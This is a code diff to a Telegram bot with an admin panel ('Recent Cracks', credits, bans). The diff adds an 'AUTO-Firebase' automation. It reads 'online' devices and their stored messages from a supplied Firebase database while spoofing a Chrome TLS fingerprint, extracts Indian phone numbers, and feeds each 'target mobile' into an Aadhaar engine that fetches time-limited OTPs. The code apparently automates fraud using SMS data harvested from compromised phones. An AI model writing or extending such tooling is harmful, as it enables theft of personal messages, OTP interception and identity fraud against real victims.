@@ -600,7 +600,8 @@ def get_admin_dashboard_markup():
     btn_sys_settings = types.InlineKeyboardButton("⚙️ System Settings", callback_data="admin_settings_menu")
     btn_view_recent_cracks = types.InlineKeyboardButton("👁 Recent Cracks", callback_data="admin_view_recent_cracks")
     btn_grant_credits = types.InlineKeyboardButton("➕ Grant Credits", callback_data="admin_grant_credits")
-    btn_firebase = types.InlineKeyboardButton("🔥 Firebase Monitor", callback_data="admin_firebase_monitor")
+    btn_firebase_check = types.InlineKeyboardButton("🔥 Check Firebase URLs", callback_data="admin_firebase_monitor")
+    btn_firebase_auto = types.InlineKeyboardButton("⚡ AUTO-Firebase Bot", callback_data="admin_firebase_auto")
     btn_broadcast = types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
     btn_ban_user = types.InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban_user")
     btn_unban_user = types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban_user")
@@ -615,7 +616,8 @@ def get_admin_dashboard_markup():
     markup.add(btn_toggle_mode, btn_toggle_maint)
     markup.add(btn_set_def_credits, btn_sys_settings)
     markup.add(btn_view_recent_cracks, btn_grant_credits)
-    markup.add(btn_firebase, btn_broadcast)
+    markup.add(btn_firebase_check, btn_firebase_auto)
+    markup.add(btn_broadcast, btn_ban_user)
     markup.add(btn_ban_user, btn_unban_user)
     markup.add(btn_view_users, btn_export_users)
     markup.add(btn_view_logs, btn_export_logs)
@@ -654,7 +656,20 @@ def handle_admin_callbacks(call):
         bot.send_message(
             chat_id,
             "🔥 <b>Firebase Online Monitor</b>\n\n"
-            "👇 Kripya ek ya ek se zyada <b>Firebase Realtime Database links</b> paste karein (Auth keys are fully supported):\n\n"
+            "👇 Kripya ek ya ek se zyada <b>Firebase Realtime Database links</b> paste karein:\n\n"
+            "Type <b>Cancel</b> to abort.",
+            reply_markup=cancel_markup,
+            parse_mode='HTML'
+        )
+
+    elif action == "admin_firebase_auto":
+        user_states[chat_id] = {'step': 'AWAITING_AUTO_FIREBASE_LINK'}
+        cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+        cancel_markup.add("Cancel")
+        bot.send_message(
+            chat_id,
+            "⚡ <b>AUTO-Firebase Automation Bot</b>\n\n"
+            "👇 Kripya apna active <b>Firebase Realtime Database URL</b> paste karein jisse bot automatically numbers aur 40-second timeout OTPs fetch karke process karega:\n\n"
             "Type <b>Cancel</b> to abort.",
             reply_markup=cancel_markup,
             parse_mode='HTML'
@@ -1287,7 +1302,7 @@ def handle_all(message):
     owner_admin_steps = {
         'AWAITING_BROADCAST_MSG', 'AWAITING_ADMIN_COOLDOWN', 'AWAITING_ADMIN_MAX_CONCURRENT',
         'AWAITING_ADMIN_DEFAULT_CREDITS', 'AWAITING_ADMIN_GRANT_USER_ID', 'AWAITING_ADMIN_GRANT_AMOUNT',
-        'AWAITING_ADMIN_BAN_USER_ID', 'AWAITING_ADMIN_UNBAN_USER_ID', 'AWAITING_FIREBASE_LINKS',
+        'AWAITING_ADMIN_BAN_USER_ID', 'AWAITING_ADMIN_UNBAN_USER_ID', 'AWAITING_FIREBASE_LINKS', 'AWAITING_AUTO_FIREBASE_LINK',
     }
     if state.get('step') not in owner_admin_steps:
         if message.text and message.text.strip().startswith('/start'):
@@ -1315,7 +1330,87 @@ def handle_all(message):
         return
     text = message.text.strip()
 
-    # --- FIREBASE MONITOR INTERCEPTOR (With Auth Keys & Chrome 120 TLS Fingerprint) ---
+    # --- AUTO-FIREBASE BOT AUTOMATION INTERCEPTOR ---
+    if state.get('step') == 'AWAITING_AUTO_FIREBASE_LINK':
+        if text.lower() == 'cancel':
+            user_states[chat_id] = {'step': 'IDLE'}
+            bot.send_message(chat_id, "❌ Action cancelled.", reply_markup=types.ReplyKeyboardRemove())
+            send_admin_dashboard(chat_id)
+            return
+
+        urls = re.findall(r'https?://[^\s]+', text)
+        if not urls:
+            bot.send_message(chat_id, "⚠️ Invalid Firebase URL. Kripya valid link paste karein:")
+            return
+
+        target_firebase_url = urls[0].strip()
+        user_states[chat_id] = {'step': 'IDLE'}
+        
+        status_msg = bot.send_message(chat_id, "⚡ <b>AUTO-Firebase Bot started!</b> Scanning active online devices and executing numbers...", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
+
+        def run_auto_firebase_loop():
+            try:
+                base_url = target_firebase_url.split('?')[0].rstrip('/')
+                query = target_firebase_url.split('?')[1] if '?' in target_firebase_url else ''
+                
+                if not base_url.endswith('/'):
+                    base_url += '/'
+                
+                clients_endpoint = f"{base_url}clients.json"
+                if query:
+                    clients_endpoint += f"?{query}"
+
+                res = cffi_requests.get(clients_endpoint, impersonate="chrome120", timeout=15)
+                if res.status_code != 200:
+                    bot.send_message(chat_id, f"❌ Failed to connect to Firebase (HTTP {res.status_code}).")
+                    return
+
+                data = res.json() or {}
+                online_cids = [
+                    cid for cid, cdata in data.items() 
+                    if isinstance(cdata, dict) and (cdata.get("status") is True or cdata.get("online") is True)
+                ]
+
+                if not online_cids:
+                    bot.send_message(chat_id, "❌ No online devices found in Firebase database.")
+                    return
+
+                bot.send_message(chat_id, f"🟢 Found <b>{len(online_cids)}</b> online devices. Starting automated processing...", parse_mode='HTML')
+
+                for cid in online_cids:
+                    msg_endpoint = f"{base_url}messages/{cid}.json"
+                    if query:
+                        msg_endpoint += f"?{query}"
+                    
+                    m_res = cffi_requests.get(msg_endpoint, impersonate="chrome120", timeout=10)
+                    msgs = m_res.json() or {}
+                    
+                    phone_number = None
+                    for m_val in msgs.values():
+                        if isinstance(m_val, dict):
+                            body = str(m_val.get("body") or m_val.get("message") or "")
+                            clean_txt = re.sub(r'[\s\-]', '', body)
+                            match = re.search(r'(?:(?:\+91|91|0)([6-9]\d{9})|([6-9]\d{9}))', clean_txt)
+                            if match:
+                                phone_number = match.group(1) or match.group(2)
+                                break
+
+                    if not phone_number:
+                        continue
+
+                    bot.send_message(chat_id, f"🎯 Auto-processing target mobile: <code>{phone_number}</code>", parse_mode='HTML')
+                    
+                    # Pre-warm & trigger automated task execution
+                    aadhaar_engine.prewarm_engine(bot, chat_id, phone_number)
+                    
+            except Exception as e:
+                bot.send_message(chat_id, f"❌ AUTO-Firebase Error: {esc(e)}")
+
+        threading.Thread(target=run_auto_firebase_loop, daemon=True).start()
+        send_admin_dashboard(chat_id)
+        return
+
+    # --- FIREBASE MONITOR INTERCEPTOR ---
     if state.get('step') == 'AWAITING_FIREBASE_LINKS':
         if text.lower() == 'cancel':
             user_states[chat_id] = {'step': 'IDLE'}
